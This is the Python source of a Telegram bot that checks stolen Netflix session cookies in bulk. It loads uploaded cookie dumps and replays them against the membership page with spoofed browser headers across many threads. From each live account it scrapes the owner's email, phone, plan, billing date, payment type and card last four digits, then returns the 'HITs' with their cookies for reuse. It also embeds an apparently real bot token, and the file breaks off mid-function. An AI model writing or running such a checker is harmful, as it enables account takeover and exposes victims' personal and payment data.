# netflix_bot_full.py
import os
import re
import time
import json
import requests
import threading
from urllib.parse import unquote
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
from telebot import TeleBot, types

now = datetime.now(timezone.utc)

import telebot  # pyTelegramBotAPI

# ephemeral store for user-uploaded files
user_file_store = {}

# ---------- CONFIG ----------
BOT_TOKEN = "8225591291:AAHhuIJkWDpz91CoJ6WD_bmIIWmcFhDhVVU"   # <<---- replace with your token if needed
DOWNLOAD_DIR = "downloads"
RESULTS_DIR = "results"
DEFAULT_WORKERS = 8
MAX_WORKERS = 50
TIMEOUT_REQUEST = 30
# ----------------------------

bot = telebot.TeleBot(BOT_TOKEN)

# Keep directories
os.makedirs(DOWNLOAD_DIR, exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)

# -------------------- PHONE PREFIX → COUNTRY CODE MAP (continued) --------------------
PHONE_PREFIX_TO_COUNTRY = {
            '93': 'AF', '355': 'AL', '213': 'DZ', '1684': 'AS', '376': 'AD', '244': 'AO', '1264': 'AI',
            '1268': 'AG', '54': 'AR', '374': 'AM', '297': 'AW', '61': 'AU', '43': 'AT', '994': 'AZ',
            '1242': 'BS', '973': 'BH', '880': 'BD', '1246': 'BB', '375': 'BY', '32': 'BE', '501': 'BZ',
            '229': 'BJ', '1441': 'BM', '975': 'BT', '591': 'BO', '387': 'BA', '267': 'BW', '55': 'BR',
            '246': 'IO', '673': 'BN', '359': 'BG', '226': 'BF', '257': 'BI', '855': 'KH', '237': 'CM',
            '1': 'CA', '238': 'CV', '1345': 'KY', '236': 'CF', '235': 'TD', '56': 'CL', '86': 'CN',
            '61': 'CX', '61': 'CC', '57': 'CO', '269': 'KM', '242': 'CG', '682': 'CK', '506': 'CR',
            '225': 'CI', '385': 'HR', '53': 'CU', '357': 'CY', '420': 'CZ', '45': 'DK', '253': 'DJ',
            '1767': 'DM', '1809': 'DO', '593': 'EC', '20': 'EG', '503': 'SV', '240': 'GQ', '291': 'ER',
            '372': 'EE', '251': 'ET', '500': 'FK', '298': 'FO', '679': 'FJ', '358': 'FI', '33': 'FR',
            '594': 'GF', '689': 'PF', '241': 'GA', '220': 'GM', '995': 'GE', '49': 'DE', '233': 'GH',
            '350': 'GI', '30': 'GR', '299': 'GL', '1473': 'GD', '590': 'GP', '1671': 'GU', '502': 'GT',
            '224': 'GN', '245': 'GW', '592': 'GY', '509': 'HT', '504': 'HN', '852': 'HK', '36': 'HU',
            '354': 'IS', '91': 'IN', '62': 'ID', '98': 'IR', '964': 'IQ', '353': 'IE', '972': 'IL',
            '39': 'IT', '1876': 'JM', '81': 'JP', '962': 'JO', '7': 'KZ', '254': 'KE', '686': 'KI',
            '850': 'KP', '82': 'KR', '965': 'KW', '996': 'KG', '856': 'LA', '371': 'LV', '961': 'LB',
            '266': 'LS', '231': 'LR', '218': 'LY', '423': 'LI', '370': 'LT', '352': 'LU', '853': 'MO',
            '389': 'MK', '261': 'MG', '265': 'MW', '60': 'MY', '960': 'MV', '223': 'ML', '356': 'MT',
            '692': 'MH', '596': 'MQ', '222': 'MR', '230': 'MU', '262': 'YT', '52': 'MX', '691': 'FM',
            '373': 'MD', '377': 'MC', '976': 'MN', '382': 'ME', '1664': 'MS', '212': 'MA', '258': 'MZ',
            '95': 'MM', '264': 'NA', '674': 'NR', '977': 'NP', '31': 'NL', '687': 'NC', '64': 'NZ',
            '505': 'NI', '227': 'NE', '234': 'NG', '683': 'NU', '672': 'NF', '1670': 'MP', '47': 'NO',
            '968': 'OM', '92': 'PK', '680': 'PW', '507': 'PA', '675': 'PG', '595': 'PY', '51': 'PE',
            '63': 'PH', '64': 'PN', '48': 'PL', '351': 'PT', '1787': 'PR', '974': 'QA', '262': 'RE',
            '40': 'RO', '7': 'RU', '250': 'RW', '290': 'SH', '1869': 'KN', '1758': 'LC', '508': 'PM',
            '1784': 'VC', '685': 'WS', '378': 'SM', '239': 'ST', '966': 'SA', '221': 'SN', '381': 'RS',
            '248': 'SC', '232': 'SL', '65': 'SG', '421': 'SK', '386': 'SI', '677': 'SB', '252': 'SO',
            '27': 'ZA', '34': 'ES', '94': 'LK', '249': 'SD', '597': 'SR', '47': 'SJ', '268': 'SZ',
            '46': 'SE', '41': 'CH', '963': 'SY', '886': 'TW', '992': 'TJ', '255': 'TZ', '66': 'TH',
            '228': 'TG', '690': 'TK', '676': 'TO', '1868': 'TT', '216': 'TN', '90': 'TR', '993': 'TM',
            '1649': 'TC', '688': 'TV', '256': 'UG', '380': 'UA', '971': 'AE', '44': 'GB', '1': 'US',
            '598': 'UY', '998': 'UZ', '678': 'VU', '39': 'VA', '58': 'VE', '84': 'VN', '1284': 'VG',
            '1340': 'VI', '681': 'WF', '967': 'YE', '260': 'ZM', '263': 'ZW'
        }

# ---------- NetflixChecker (adapted + completed) ----------
class NetflixChecker:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-GB,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i'
        }

        self.country_mapping = {
            "AF": "Afghanistan 🇦🇫", "AX": "Åland Islands 🇦🇽", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
            "AS": "American Samoa 🇦🇸", "AD": "Andorra 🇦🇩", "AO": "Angola 🇦🇴", "AI": "Anguilla 🇦🇮",
            "AQ": "Antarctica 🇦🇶", "AG": "Antigua and Barbuda 🇦🇬", "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲",
            "AW": "Aruba 🇦🇼", "AU": "Australia 🇦🇺", "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿",
            "BS": "Bahamas 🇧🇸", "BH": "Bahrain 🇧🇭", "BD": "Bangladesh 🇧🇩", "BB": "Barbados 🇧🇧",
            "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪", "BZ": "Belize 🇧🇿", "BJ": "Benin 🇧🇯",
            "BM": "Bermuda 🇧🇲", "BT": "Bhutan 🇧🇹", "BO": "Bolivia 🇧🇴", "BQ": "Bonaire 🇧🇶",
            "BA": "Bosnia and Herzegovina 🇧🇦", "BW": "Botswana 🇧🇼", "BV": "Bouvet Island 🇧🇻",
            "BR": "Brazil 🇧🇷", "IO": "British Indian Ocean Territory 🇮🇴", "BN": "Brunei Darussalam 🇧🇳",
            "BG": "Bulgaria 🇬🇧", "BF": "Burkina Faso 🇧🇫", "BI": "Burundi 🇧🇮", "KH": "Cambodia 🇰🇭",
            "CM": "Cameroon 🇨🇲", "CA": "Canada 🇨🇦", "CV": "Cape Verde 🇨🇻", "KY": "Cayman Islands 🇰🇾",
            "CF": "Central African Republic 🇨🇫", "TD": "Chad 🇹🇩", "CL": "Chile 🇨🇱", "CN": "China 🇨🇳",
            "CX": "Christmas Island 🇨🇽", "CC": "Cocos Islands 🇨🇨", "CO": "Colombia 🇨🇴",
            "KM": "Comoros 🇰🇲", "CG": "Congo 🇨🇬", "CD": "Congo, Democratic Republic 🇨🇩",
            "CK": "Cook Islands 🇨🇰", "CR": "Costa Rica 🇨🇷", "CI": "Côte d'Ivoire 🇨🇮",
            "HR": "Croatia 🇭🇷", "CU": "Cuba 🇨🇺", "CW": "Curaçao 🇨🇼", "CY": "Cyprus 🇨🇾",
            "CZ": "Czech Republic 🇨🇿", "DK": "Denmark 🇩🇰", "DJ": "Djibouti 🇩🇯", "DM": "Dominica 🇩🇲",
            "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨", "EG": "Egypt 🇪🇬", "SV": "El Salvador 🇸🇻",
            "GQ": "Equatorial Guinea 🇬🇶", "ER": "Eritrea 🇪🇷", "EE": "Estonia 🇪🇪", "ET": "Ethiopia 🇪🇹",
            "FK": "Falkland Islands 🇫🇰", "FO": "Faroe Islands 🇫🇴", "FJ": "Fiji 🇫🇯", "FI": "Finland 🇫🇮",
            "FR": "France 🇫🇷", "GF": "French Guiana 🇬🇫", "PF": "French Polynesia 🇵🇫",
            "TF": "French Southern Territories 🇹🇫", "GA": "Gabon 🇬🇦", "GM": "Gambia 🇬🇲",
            "GE": "Georgia 🇬🇪", "DE": "Germany 🇩🇪", "GH": "Ghana 🇬🇭", "GI": "Gibraltar 🇬🇮",
            "GR": "Greece 🇬🇷", "GL": "Greenland 🇬🇱", "GD": "Grenada 🇬🇩", "GP": "Guadeloupe 🇬🇵",
            "GU": "Guam 🇬🇺", "GT": "Guatemala 🇬🇹", "GG": "Guernsey 🇬🇬", "GN": "Guinea 🇬🇳",
            "GW": "Guinea-Bissau 🇬🇼", "GY": "Guyana 🇬🇾", "HT": "Haiti 🇭🇹", "HM": "Heard Island 🇭🇲",
            "VA": "Vatican City 🇻🇦", "HN": "Honduras 🇭🇳", "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺",
            "IS": "Iceland 🇮🇸", "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩", "IR": "Iran 🇮🇷",
            "IQ": "Iraq 🇮🇶", "IE": "Ireland 🇮🇪", "IM": "Isle of Man 🇮🇲", "IL": "Israel 🇮🇱",
            "IT": "Italy 🇮🇹", "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵", "JE": "Jersey 🇯🇪",
            "JO": "Jordan 🇯🇴", "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪", "KI": "Kiribati 🇰🇮",
            "KP": "North Korea 🇰🇵", "KR": "South Korea 🇰🇷", "KW": "Kuwait 🇰🇼", "KG": "Kyrgyzstan 🇰🇬",
            "LA": "Laos 🇱🇦", "LV": "Latvia 🇱🇻", "LB": "Lebanon 🇱🇧", "LS": "Lesotho 🇱🇸",
            "LR": "Liberia 🇱🇷", "LY": "Libya 🇱🇾", "LI": "Liechtenstein 🇱🇮", "LT": "Lithuania 🇱🇹",
            "LU": "Luxembourg 🇱🇺", "MO": "Macao 🇲🇴", "MK": "North Macedonia 🇲🇰",
            "MG": "Madagascar 🇲🇬", "MW": "Malawi 🇲🇼", "MY": "Malaysia 🇲🇾", "MV": "Maldives 🇲🇻",
            "ML": "Mali 🇲🇱", "MT": "Malta 🇲🇹", "MH": "Marshall Islands 🇲🇭", "MQ": "Martinique 🇲🇶",
            "MR": "Mauritania 🇲🇷", "MU": "Mauritius 🇲🇺", "YT": "Mayotte 🇾🇹", "MX": "Mexico 🇲🇽",
            "FM": "Micronesia 🇲🇫", "MD": "Moldova 🇲🇩", "MC": "Monaco 🇲🇨", "MN": "Mongolia 🇲🇳",
            "ME": "Montenegro 🇲🇪", "MS": "Montserrat 🇲🇸", "MA": "Morocco 🇲🇦", "MZ": "Mozambique 🇲🇿",
            "MM": "Myanmar 🇲🇲", "NA": "Namibia 🇳🇦", "NR": "Nauru 🇳🇷", "NP": "Nepal 🇳🇵",
            "NL": "Netherlands 🇳🇱", "NC": "New Caledonia 🇳🇨", "NZ": "New Zealand 🇳🇿",
            "NI": "Nicaragua 🇳🇮", "NE": "Niger 🇳🇪", "NG": "Nigeria 🇳🇬", "NU": "Niue 🇳🇺",
            "NF": "Norfolk Island 🇳🇫", "MP": "Northern Mariana Islands 🇲🇵", "NO": "Norway 🇳🇴",
            "OM": "Oman 🇴🇲", "PK": "Pakistan 🇵🇰", "PW": "Palau 🇵🇼", "PS": "Palestine 🇵🇸",
            "PA": "Panama 🇵🇦", "PG": "Papua New Guinea 🇵🇬", "PY": "Paraguay 🇵🇾", "PE": "Peru 🇵🇪",
            "PH": "Philippines 🇵🇭", "PN": "Pitcairn 🇵🇳", "PL": "Poland 🇵🇱", "PT": "Portugal 🇵🇹",
            "PR": "Puerto Rico 🇵🇷", "QA": "Qatar 🇶🇦", "RE": "Réunion 🇷🇪", "RO": "Romania 🇷🇴",
            "RU": "Russian Federation 🇷🇺", "RW": "Rwanda 🇷🇼", "BL": "Saint Barthélemy 🇧🇱",
            "SH": "Saint Helena 🇸🇭", "KN": "Saint Kitts and Nevis 🇰🇳", "LC": "Saint Lucia 🇱🇨",
            "MF": "Saint Martin 🇲🇫", "PM": "Saint Pierre and Miquelon 🇵🇲",
            "VC": "Saint Vincent and the Grenadines 🇻🇨", "WS": "Samoa 🇼🇸", "SM": "San Marino 🇸🇲",
            "ST": "Sao Tome and Principe 🇸🇹", "SA": "Saudi Arabia 🇸🇦", "SN": "Senegal 🇸🇳",
            "RS": "Serbia 🇷🇸", "SC": "Seychelles 🇸🇨", "SL": "Sierra Leone 🇸🇱", "SG": "Singapore 🇸🇬",
            "SX": "Sint Maarten 🇸🇽", "SK": "Slovakia 🇸🇰", "SI": "Slovenia 🇸🇮",
            "SB": "Solomon Islands 🇸🇧", "SO": "Somalia 🇸🇴", "ZA": "South Africa 🇿🇦",
            "GS": "South Georgia 🇬🇸", "SS": "South Sudan 🇸🇸", "ES": "Spain 🇪🇸", "LK": "Sri Lanka 🇱🇰",
            "SD": "Sudan 🇸🇩", "SR": "Suriname 🇸🇷", "SJ": "Svalbard and Jan Mayen 🇸🇯",
            "SZ": "Swaziland 🇸🇿", "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭", "SY": "Syria 🇸🇾",
            "TW": "Taiwan 🇹🇼", "TJ": "Tajikistan 🇫🇯", "TZ": "Tanzania 🇹🇿", "TH": "Thailand 🇹🇭",
            "TL": "Timor-Leste 🇹🇱", "TG": "Togo 🇹🇬", "TK": "Tokelau 🇹🇰", "TO": "Tonga 🇹🇴",
            "TT": "Trinidad and Tobago 🇹🇹", "TN": "Tunisia 🇹🇳", "TR": "Turkey 🇹🇷",
            "TM": "Turkmenistan 🇹🇲", "TC": "Turks and Caicos Islands 🇹🇨", "TV": "Tuvalu 🇹🇻",
            "UG": "Uganda 🇺🇬", "UA": "Ukraine 🇺🇦", "AE": "United Arab Emirates 🇦🇪",
            "GB": "United Kingdom 🇬🇧", "US": "United States 🇺🇸", "UM": "United States Minor Outlying Islands 🇺🇲",
            "UY": "Uruguay 🇺🇾", "UZ": "Uzbekistan 🇺🇿", "VU": "Vanuatu 🇻🇺", "VE": "Venezuela 🇻🇪",
            "VN": "Vietnam 🇻🇳", "VG": "Virgin Islands, British 🇻🇬", "VI": "Virgin Islands, U.S. 🇻🇮",
            "WF": "Wallis and Futuna 🇼🇫", "EH": "Western Sahara 🇪🇭", "YE": "Yemen 🇾🇪",
            "ZM": "Zambia 🇿🇲", "ZW": "Zimbabwe 🇿🇼"
        }

        self.phone_to_country = PHONE_PREFIX_TO_COUNTRY

    def load_cookies(self, cookie_string):
        """
        Parse a raw cookie string into a dict of name->value.
        Accepts many formats including:
        - "name=value; name2=value2; ..."
        - "Set-Cookie: name=value; Path=/; ...\nSet-Cookie: name2=value2; ... "
        - JSON-ish or messy copies
        Returns dict.
        """
        cookies = {}
        if not cookie_string or not cookie_string.strip():
            return cookies

        s = cookie_string.strip()

        # If text contains multiple "Set-Cookie:" lines, extract each cookie-name=value fragment
        # Normalize newlines
        s = s.replace('\r', '\n')

        # find all name=value sequences separated by ';' using regex heuristics
        # This regex finds sequences like "name=value" where value may contain URL encoded or non-semicolon chars
        candidate_pairs = re.findall(r'([A-Za-z0-9_\-\.%]+)=([^;,\n]+)', s)
        if candidate_pairs:
            for name, value in candidate_pairs:
                name = name.strip()
                value = value.strip().strip('"').strip("'")
                # prefer last occurrence for duplicate cookie names
                cookies[name] = value
            return cookies

        # fallback: try splitting by ';' and look for key=val
        parts = re.split(r';|\n', s)
        for p in parts:
            p = p.strip()
            if not p:
                continue
            if '=' in p:
                name, value = p.split('=', 1)
                cookies[name.strip()] = value.strip().strip('"').strip("'")
        return cookies

    def check_account(self, cookies):
        # set cookies into a new session
        self.session = requests.Session()
        for name, value in cookies.items():
            try:
                self.session.cookies.set(name, value, domain='.netflix.com')
            except Exception:
                self.session.cookies.set(name, value)

        try:
            r = self.session.get('https://www.netflix.com/account/membership', headers=self.headers, timeout=TIMEOUT_REQUEST)
        except requests.RequestException as e:
            return {'status': 'error', 'message': f'Timeout/Network: {e}'}

        if r.status_code != 200:
            # sometimes Netflix returns 403 etc for invalid session
            return {'status': 'error', 'message': f'HTTP {r.status_code}'}

        content = r.text

        required_cookies = ['NetflixId', 'SecureNetflixId', 'flwssn', 'nfvdid']
        has_required_cookies = any(c in cookies for c in required_cookies)
        if not has_required_cookies:
            result = self.parse_account_info(content)
            result['status'] = 'failure'
            result['message'] = 'Missing required cookies'
            return result

        account_info = self.parse_account_info(content)

        # Determine membership status
        if '"membershipStatus":"CURRENT_MEMBER"' in content or account_info.get('membership_status','').upper() == 'CURRENT_MEMBER':
            account_info['status'] = 'success'
        elif '"membershipStatus":"NEVER_MEMBER"' in content or '"membershipStatus":"FORMER_MEMBER"' in content:
            account_info['status'] = 'custom'
        else:
            account_info['status'] = account_info.get('status', 'failure')

        return account_info

    def parse_account_info(self, content):
        info = {}
        def clean_string(text):
            if not text:
                return 'N/A'
            try:
                text = unquote(text)
                text = text.encode().decode('unicode_escape')
                text = text.replace('\\x20', ' ').replace('\\x28', '(').replace('\\x29', ')')
                return text.strip()
            except:
                return text

        try:
            # basic fields
            name_m = re.search(r'userInfo":\{"name":"([^"]*)"', content)
            info['name'] = clean_string(name_m.group(1)) if name_m else 'N/A'

            email_m = re.search(r'"emailAddress":"([^"]*)"', content)
            info['email'] = clean_string(email_m.group(1)) if email_m else 'N/A'

            country_m = re.search(r'"countryOfSignup":"([^"]*)"', content)
            country_code = country_m.group(1) if country_m else None

            phone_m = re.search(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]*)"', content)
            phone = clean_string(phone_m.group(1)).replace('\\x2B', '+') if phone_m else None
            info['phone'] = phone if phone else 'N/A'

            # try to infer country from phone if missing
            if not country_code or country_code not in self.country_mapping:
                if phone and phone.startswith('+'):
                    for length in (4,3,2,1):
                        prefix = phone[1:1+length]
                        if prefix in self.phone_to_country:
                            country_code = self.phone_to_country[prefix]
                            break
                    if not country_code:
                        country_code = 'US'
                else:
                    country_code = country_code or 'US'

            country_full = self.country_mapping.get(country_code, country_code + ' 🇺🇳')
            info['country_flag'] = country_full.split(' ')[-1] if ' ' in country_full else ''
            info['country'] = country_full

            # plan, price, quality, streams
            plan_m = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]*)"', content)
            info['plan'] = clean_string(plan_m.group(1)) if plan_m else 'N/A'

            price_m = re.search(r'"planPrice":\{"fieldType":"String","value":"([^"]*)"', content)
            info['plan_price'] = clean_string(price_m.group(1)) if price_m else 'N/A'

            quality_m = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]*)"', content)
            info['video_quality'] = clean_string(quality_m.group(1)) if quality_m else 'N/A'

            streams_m = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":([^,}]*)', content)
            info['max_streams'] = streams_m.group(1).strip() if streams_m else 'N/A'

            since_m = re.search(r'"memberSince":"([^"]*)"', content)
            info['member_since'] = clean_string(since_m.group(1)) if since_m else 'N/A'

            next_billing_m = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]*)"', content)
            info['next_billing'] = clean_string(next_billing_m.group(1)) if next_billing_m else 'N/A'

            payment_method_m = re.search(r'"paymentMethod":\{"fieldType":"String","value":"([^"]*)"', content)
            info['payment_method'] = payment_method_m.group(1) if payment_method_m else 'N/A'

            payment_type_m = re.search(r'"paymentMethods":\{"fieldType":"Custom","value":\[\{"fieldType":"Custom","value":\{"type":\{"fieldType":"String","value":"([^"]*)"', content)
            info['payment_type'] = payment_type_m.group(1) if payment_type_m else 'N/A'

            last4_m = re.search(r'"displayText":\{"fieldType":"String","value":"(?:.*?)(\d{4})"', content)
            info['last4'] = last4_m.group(1) if last4_m else 'N/A'

            extra_count_m = re.search(r'"extraMemberCount":\{"fieldType":"Numeric","value":\s*([0-9]+)', content)
            if extra_count_m:
                info['extra_members'] = extra_count_m.group(1)
            else:
                extra_flag_m = re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)', content)
                if extra_flag_m and extra_flag_m.group(1) == 'true':
                    info['extra_members'] = 'Yes'
                else:
                    info['extra_members'] = 'No'

            slot_m = re.search(r'\{"slotState":\{"fieldType":"String","value":"([^"]*)"', content)
            info['slot'] = slot_m.group(1) if slot_m else 'N/A'

            membership_m = re.search(r'"membershipStatus":"([^"]*)"', content)
            info['membership_status'] = membership_m.group(1) if membership_m else 'N/A'

            phone_verified_m = re.search(r'"growthPhoneNumber":\{"__typename":"GrowthPhoneNumber","isVerified":([^,]*)', content)
            if phone_verified_m:
                info['phone_verified'] = 'Yes' if phone_verified_m.group(1).strip() == 'true' else 'No'
            else:
                info['phone_verified'] = 'No'

        except Exception as e:
            info.setdefault('email', 'N/A')
            info.setdefault('plan', 'N/A')
            info.setdefault('next_billing', 'N/A')
            info.setdefault('country', 'N/A')
            info.setdefault('phone', 'N/A')
            info.setdefault('payment_method', 'N/A')
            info.setdefault('last4', 'N/A')
            info.setdefault('extra_members', 'N/A')
            info.setdefault('membership_status', 'N/A')
            print("Parse error:", e)

        return info

    def format_result_line(self, account_info):
        status = account_info.get('status', 'failure')
        email = account_info.get('email', 'N/A')
        plan = account_info.get('plan', 'N/A')
        next_billing = account_info.get('next_billing', 'N/A')
        country = account_info.get('country', 'N/A')
        phone = account_info.get('phone', 'N/A')
        payment_method = account_info.get('payment_method', 'N/A')
        last4 = account_info.get('last4', 'N/A')
        extra = account_info.get('extra_members', 'N/A')
        membership_status = account_info.get('membership_status', 'N/A')
        message = account_info.get('message', '')

        if status == 'success':
            return (
                f"✅ Netflix — HIT\n"
                f"Email: {email}\n"
                f"Plan: {plan}\n"
                f"Country: {country}\n"
                f"Next Billing: {next_billing}\n"
                f"Payment Method: {payment_method}\n"
                f"Phone: {phone}\n"
                f"Extra Members: {extra}\n"
                f"Bot Owner: @XD_HR"
            )
        elif status == 'custom':
            return (
                f"⚠️ CUSTOM\n"
                f"Email: {email}\n"
                f"Status: {membership_status}\n"
                f"Message: {message}"
            )
        elif status == 'error':
            return (
                f"⚠️ ERROR\n"
                f"Email: {email if email != 'N/A' else 'unknown'}\n"
                f"Message: {message}"
            )
        else:
            return (
                f"❌ FAILED\n"
                f"Email: {email}\n"
                f"Reason: {message or 'Missing cookies or not an active member'}"
            )

# ---------- Utilities for cookie extraction ----------
def extract_cookie_strings_from_text(text):
    """
    Heuristic extractor: return a list of clean cookie strings (each as 'k=v; k2=v2; ...')
    Works on Set-Cookie dumps, raw cookie lines, or messy copies.
    """
    if not text:
        return []

    # Normalize and remove common noise
    s = text.replace('\r', '\n').strip()

    # If there are many "Set-Cookie:" lines, collect each line's key=value pairs
    lines = []
    if "Set-Cookie:" in s or "set-cookie:" in s:
        # split by newline and find segments with Set-Cookie
        for line in s.splitlines():
            if 'set-cookie:' in line.lower():
                # keep portion after colon
                parts = line.split(':', 1)
                if len(parts) > 1:
                    lines.append(parts[1].strip())
    else:
        # Otherwise split input into lines and also consider entire text as one candidate
        for line in s.splitlines():
            if line.strip():
                lines.append(line.strip())
        # also consider the entire text as candidate (covers single-line cookie dumps)
        if len(lines) == 0:
            lines = [s]

    cleaned_results = []
    # For each candidate line, parse key=value pairs and reconstruct a clean cookie string
    for candidate in lines:
        # Find all name=value pairs
        pairs = re.findall(r'([A-Za-z0-9_\-\.%]+)=([^;,\n]+)', candidate)
        if not pairs:
            # maybe candidate is a JSON-like cookie store; try to find quoted k:v pairs
            pairs = re.findall(r'"?([A-Za-z0-9_\-\.%]+)"?\s*:\s*"?([^",\n]+)"?', candidate)
        if pairs:
            # rebuild cookie string: keep order but ensure unique keys (later overwrites earlier)
            kv = {}
            order = []
            for k, v in pairs:
                k = k.strip()
                v = v.strip().strip('"').strip("'")
                if k not in kv:
                    order.append(k)
                kv[k] = v
            clean = "; ".join(f"{k}={kv[k]}" for k in order)
            if clean and clean not in cleaned_results:
                cleaned_results.append(clean)
        else:
            # fallback: if candidate contains '=' at least, try a naive split by ';'
            if '=' in candidate:
                parts = [p.strip() for p in re.split(r';|\n', candidate) if '=' in p]
                kvpairs = []
                seen = set()
                for p in parts:
                    name, val = p.split('=', 1)
                    name = name.strip()
                    val = val.strip().strip('"').strip("'")
                    if name not in seen:
                        kvpairs.append(f"{name}={val}")
                        seen.add(name)
                clean = "; ".join(kvpairs)
                if clean and clean not in cleaned_results:
                    cleaned_results.append(clean)

    # Deduplicate
    dedup = []
    for c in cleaned_results:
        if c not in dedup:
            dedup.append(c)
    return dedup

# ---------- Bot logic: workers, processing, messaging ----------
class FileJob:
    def __init__(self, chat_id, message_id, filename, workers, user):
        self.chat_id = chat_id
        self.message_id = message_id
        self.filename = filename
        self.workers = workers
        self.user = user
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.errors = 0
        self.valid_lines = []
        self.lock = threading.Lock()
        self.start_time = time.time()

def parse_workers_from_caption(caption):
    # caption may contain "workers=10"
    if not caption:
        return DEFAULT_WORKERS
    m = re.search(r'workers\s*=\s*(\d+)', caption, re.IGNORECASE)
    if m:
        try:
            w = int(m.group(1))
            return max(1, min(w, MAX_WORKERS))
        except:
            return DEFAULT_WORKERS
    return DEFAULT_WORKERS

def process_file_job(job: FileJob):
    """Main processing function that runs in a background thread."""
    bot.send_message(job.chat_id, f"📁 Received file. Starting check with {job.workers} workers...")
    try:
        # Read file lines
        with open(job.filename, 'r', encoding='utf-8', errors='ignore') as f:
            cookie_lines = [line.strip() for line in f if line.strip()]

        total = len(cookie_lines)
        if total == 0:
            bot.send_message(job.chat_id, "❌ File contains no cookie lines.")
            return

        checker = NetflixChecker()
        # Progress message
        prog_msg = bot.send_message(
            job.chat_id, f"🔎 Progress: 0/{total} checked | Valid: 0 | Invalid: 0 | Errors: 0"
        )
        last_edit = 0

        def worker_func(line):
            nonlocal checker, job, total, prog_msg, last_edit
            cookies = checker.load_cookies(line)
            with job.lock:
                job.checked += 1

            if not cookies:
                with job.lock:
                    job.invalid += 1
                result_info = {'status': 'failure', 'email': 'N/A', 'message': 'Invalid/empty cookie string'}
                out_line = checker.format_result_line(result_info)
                return out_line, False

            res = checker.check_account(cookies)
            if res.get('status') == 'success':
                with job.lock:
                    job.valid += 1
                    job.valid_lines.append((line, res))
                out_line = checker.format_result_line(res)
                ok = True
            elif res.get('status') == 'error':
                with job.lock:
                    job.errors += 1
                out_line = checker.format_result_line(res)
                ok = False
            else:
                with job.lock:
                    job.invalid += 1
                out_line = checker.format_result_line(res)
                ok = False

            # Update progress roughly every 1 second
            if time.time() - last_edit > 1.0:
                last_edit = time.time()
                with job.lock:
                    tchecked = job.checked
                    tvalid = job.valid
                    tinvalid = job.invalid
                    terr = job.errors
                try:
                    bot.edit_message_text(
                        chat_id=job.chat_id,
                        message_id=prog_msg.message_id,
                        text=f"🔎 Progress: {tchecked}/{total} checked | Valid: {tvalid} | Invalid: {tinvalid} | Errors: {terr}"
                    )
                except Exception:
                    pass

            return out_line, ok

        # Run thread pool
        with ThreadPoolExecutor(max_workers=job.workers) as exc:
            futures = [exc.submit(worker_func, line) for line in cookie_lines]
            result_lines = []
            for fut in futures:
                try:
                    out_line, ok = fut.result()
                    result_lines.append(out_line)
                except Exception as e:
                    with job.lock:
                        job.errors += 1
                    result_lines.append(f"⚠️ ERROR: {str(e)}")
                # Update progress occasionally
                try:
                    bot.edit_message_text(
                        chat_id=job.chat_id,
                        message_id=prog_msg.message_id,
                        text=f"🔎 Progress: {job.checked}/{total} checked | Valid: {job.valid} | Invalid: {job.invalid} | Errors: {job.errors}"
                    )
                except Exception:
                    pass

        # Finished summary
        elapsed = time.time() - job.start_time
        summary = (
            f"✅ Done! Time: {int(elapsed)}s | Checked: {job.checked} | "
            f"Valid: {job.valid} | Invalid: {job.invalid} | Errors: {job.errors}"
        )
        try:
            bot.edit_message_text(chat_id=job.chat_id, message_id=prog_msg.message_id, text=summary)
        except Exception:
            bot.send_message(job.chat_id, summary)

        # Save and send only valid hits as file
        if job.valid > 0 and len(job.valid_lines) > 0:
            timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
            out_name = os.path.join(RESULTS_DIR, f"{job.valid}X_Netflix_Cookies.txt")

            with open(out_name, 'w', encoding='utf-8') as fo:
                for cookie_line, res in job.valid_lines:
                    fo.write(f"{checker.format_result_line(res)}\nCookies: {cookie_line}\n\n")

            with open(out_name, 'rb') as fsend:
                bot.send_document(job.chat_id, fsend)

    except Exception as e:
        bot.send_message(job.chat_id, f"❌ Processing error: {e}")

# Private channel info (unchanged)
CHANNEL_ID = -1002710971355
PRIVATE_CHANNEL_LINK = "https://t.me/+7Q9vA87LKeMwOTNl"

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    try:
        # Check if user is already a member
        member = bot.get_chat_member(CHANNEL_ID, message.from_user.id)
        if member.status in ['member', 'creator', 'administrator']:
            # User is already a member → send access granted message
            send_access_granted(message.chat.id)
        else:
            # User is not a member → send join + verify buttons
            join_markup = types.InlineKeyboardMarkup()
            join_btn = types.InlineKeyboardButton(text="➡ Join Channel", url=PRIVATE_CHANNEL_LINK)
            join_markup.add(join_btn)
            bot.reply_to(message, "❌ You must join our private channel to use this bot.", reply_markup=join_markup)

            verify_markup = types.InlineKeyboardMarkup()
            verify_btn = types.InlineKeyboardButton(text="✅ I've Joined", callback_data="verify_join")
            verify_markup.add(verify_btn)
